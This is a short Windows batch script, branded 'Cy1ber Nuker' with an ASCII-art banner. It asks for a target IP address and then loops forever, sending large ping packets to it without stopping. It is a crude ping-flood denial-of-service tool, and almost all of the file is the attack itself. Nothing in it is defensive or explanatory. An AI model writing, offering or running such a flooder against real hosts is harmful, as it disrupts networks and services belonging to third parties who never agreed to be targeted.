��
@Echo off
chcp 65001
cls
color 3
title Cy1ber Nuker
echo.
echo  a88888b.          d88  dP                         
echo d8'   `88           88  88                         
echo 88        dP    dP  88  88d888b. .d8888b. 88d888b. 
echo 88        88    88  88  88'  `88 88ooood8 88'  `88 
echo Y8.   .88 88.  .88  88  88.  .88 88.  ... 88       
echo  Y88888P' `8888P88 d88P 88Y8888' `88888P' dP       
echo                .88                                 
echo            d8888P      
echo.
echo -----------------------------------------------------
echo -              CTRL + C TO STOP PINGING             -  
echo -----------------------------------------------------
set /p IP=Enter IP: 
color 3
:POD
ping %IP% -l 10000 -n 10000000 -t
GoTo POD